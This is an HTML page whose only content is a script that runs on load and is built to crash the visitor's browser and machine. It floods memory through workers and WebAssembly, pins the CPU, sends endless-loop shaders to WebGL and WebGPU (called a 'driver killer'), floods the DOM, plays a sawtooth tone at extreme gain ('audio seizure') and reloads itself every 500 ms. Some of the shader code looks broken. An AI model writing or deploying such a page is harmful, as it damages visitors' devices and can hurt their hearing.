<!DOCTYPE html>
<html>
<head>
  <title>.</title>
  <meta charset="utf-8">
  <style>body,html{margin:0;overflow:hidden;background:#000}</style>
</head>
<body>

<script>
// 1. MAXIMUM worker + blob fork-bomb (eats RAM faster than the OS can page)
setInterval(() => {
  try {
    const code = `
      onmessage = () => {
        const a = new Uint8Array(1024*1024*750); // 750 MB per worker
        a[0] = 1;
        postMessage(a.buffer, [a.buffer]);
      };
    `;
    const blob = new Blob([code], {type:'application/javascript'});
    const worker = new Worker(URL.createObjectURL(blob));
    worker.postMessage(0);
    worker.onmessage = e => worker.postMessage(e.data, [e.data]);
  } catch(e) {}
}, 0);

// 2. SharedArrayBuffer + Atomics infinite contention bomb (forces 100% CPU + cache thrashing)
const sab = new SharedArrayBuffer(1024*1024*16);
const view = new Int32Array(sab);
setInterval(() => {
  for(let i=0;i<999999;i++) Atomics.store(view, i%view.length, 0xFFFFFFFF);
}, 0);

// 3. WebAssembly memory.grow() bomb – grows to hundreds of GB until OOM killer gives up
fetch('data:application/wasm,AGFzbQEAAAABBgFgAX8Bf2ABfwMCAQNhYmlnAQAGbWVtb3J5AgAGc3RhcnQAAwAFZGF0YQABAQ==').then(r=>r.arrayBuffer()).then(bytes=>{
  WebAssembly.instantiate(bytes, {env:{}}).then(wasm=>{
    let pages = 0;
    setInterval(()=>{ try { wasm.instance.exports.memory.grow(10000); pages+=10000; } catch(e){} },0);
  });
});

// 4. WebGL / WebGPU double-barrel driver killer (NVIDIA BSOD + AMD firmware lockup)
const c = document.createElement('canvas');
c.width = c.height = 16384;
document.body.appendChild(c);
const gl = c.getContext('webgl2',{alpha:false,preserveDrawingBuffer:true}) || c.getContext('webgl');
if(gl){
  const vs = gl.createShader(gl.VERTEX_SHADER);
  gl.shaderSource(vs,'void main(){}');
  gl.compileShader(vs);
  const fs = gl.createShader(gl.FRAGMENT_SHADER);
  gl.shaderSource(fs,`
    precision lowp float;
    void main(){
      for(;;){
        uint64_t x = 0xFFFFFFFFFFFFFFFFu;
        x += x * x * x; // infinite 64-bit math → driver crash
      }
    }`);
  gl.compileShader(fs);
  const p = gl.createProgram();
  gl.attachShader(p,vs); gl.attachShader(p,fs); gl.linkProgram(p); gl.useProgram(p);
  setInterval(()=>gl.drawArrays(gl.TRIANGLES,0,1e9),0);
}

if(navigator.gpu){
  (async()=>{
    const a=await navigator.gpu.requestAdapter();
    const d=await a.requestDevice();
    const s=d.createShaderModule({code:`
      @compute @workgroup_size(256)
      fn main(){
        var x: u64 = 0xFFFFFFFFFFFFFFFFu;
        loop { x += x * x * x; }
      }
    `});
    const pipe=d.createComputePipeline({layout:'auto',compute:{module:s,entryPoint:'main'}});
    const enc=d.createCommandEncoder();
    const pass=enc.beginComputePass();
    pass.setPipeline(pipe);
    pass.dispatchWorkgroups(1<<30);
    pass.end();
    d.queue.submit([enc.finish()]);
  })();
}

// 5. DOM explosion + style recalc death spiral
setInterval(()=>{
  const d=document.createElement('div');
  d.style.cssText='position:fixed;width:100vw;height:100vh;background:linear-gradient(45deg,#f00,#00f);transform:rotate(1337deg);'.repeat(1000);
  document.body.appendChild(d);
},0);

// 6. Audio seizure at +60 dB
const ctx=new (window.AudioContext||window.webkitAudioContext)();
const osc=ctx.createOscillator(); osc.type='sawtooth'; osc.frequency.value=150;
const gain=ctx.createGain(); gain.gain.value=999;
osc.connect(gain).connect(ctx.destination);
osc.start();

// 7. Final kill – force page reload every 500 ms so it restarts the rampage after any recovery
setTimeout(()=>location.reload(),500);
</script>
</body>
</html>
